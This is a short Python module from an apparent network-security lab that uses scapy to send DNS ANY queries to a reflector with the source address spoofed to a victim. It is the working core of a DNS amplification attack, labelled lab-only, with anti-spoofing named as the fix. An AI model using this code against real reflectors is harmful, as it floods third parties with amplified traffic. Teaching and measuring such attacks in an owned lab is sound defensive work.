# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-amplif: send a spoofed DNS request to a reflector. LAB ONLY.

Sources the request from the victim so the amplified reply is delivered to the
victim. Only ever run against a reflector you own; anti-spoofing (see factor.py)
is the fix. This is a bandwidth-measuring demo, not a means to attack third parties.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    query = (
        s.IP(src=args.victim, dst=args.reflector)
        / s.UDP(sport=s.RandShort(), dport=53)
        / s.DNS(rd=1, qd=s.DNSQR(qname=args.qname, qtype="ANY"))
    )
    print(f"[*] spoofed DNS ANY for {args.qname} to {args.reflector}, reply -> {args.victim}")
    s.send(query, count=args.count, verbose=0)
    verdict("ALERT", f"reflected off {args.reflector}")
    return 0
